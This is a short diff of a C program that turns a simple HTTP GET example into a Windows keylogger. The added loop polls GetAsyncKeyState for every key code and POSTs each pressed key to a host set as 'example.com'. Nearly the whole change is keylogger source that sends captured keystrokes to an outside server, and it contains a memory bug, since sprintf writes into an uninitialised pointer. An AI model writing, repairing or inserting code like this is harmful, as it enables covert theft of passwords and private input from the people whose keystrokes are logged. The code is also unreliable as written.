@@ -1,14 +1,25 @@
 #include <stdio.h>
-#include "http.h"
+#include <windows.h>
+#include "lib/http.h"
+
+#define HOST "example.com"
 
 int main(){
-  char* data = request("GET","google.com","80","/",NULL,NULL);
+  while(1){
+    for(int i = 0;i < 255;i++){
+      short state = GetAsyncKeyState(i);
+      if(state == -32767){
+        char *data;
 
-  if(data == NULL){
-    return 1;
+        sprintf(data,"%d",i);
+
+        printf("%d\n",i);
+
+        request("POST",HOST,"80","/","text/plane",data);
+      }
+      Sleep(10);
+    }
   }
-
-  printf("%s",data);
 
   return 0;
 }
